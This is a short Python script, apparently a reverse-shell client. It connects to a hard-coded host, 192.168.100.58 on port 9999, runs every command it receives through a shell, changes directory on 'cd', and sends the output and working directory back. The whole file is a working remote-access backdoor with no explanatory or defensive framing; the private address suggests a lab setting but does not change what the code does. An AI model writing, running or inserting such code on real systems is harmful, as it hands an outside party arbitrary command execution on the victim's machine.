import socket
import subprocess
import os

host = '192.168.100.58'
port = 9999
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

while True:
 data = s.recv(1024)
 if data[:2].decode('utf-8') == 'cd':
  os.chdir(data[3:].decode('utf-8'))
 if len(data)>0:
  cmd = subprocess.Popen(data[:].decode('utf-8'),shell = True, stderr = subprocess.PIPE, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
  byte = cmd.stdout.read()+cmd.stderr.read()
  info_cliente = str(byte)
  s.send(str.encode(info_cliente)+str.encode(os.getcwd()))
s.close()
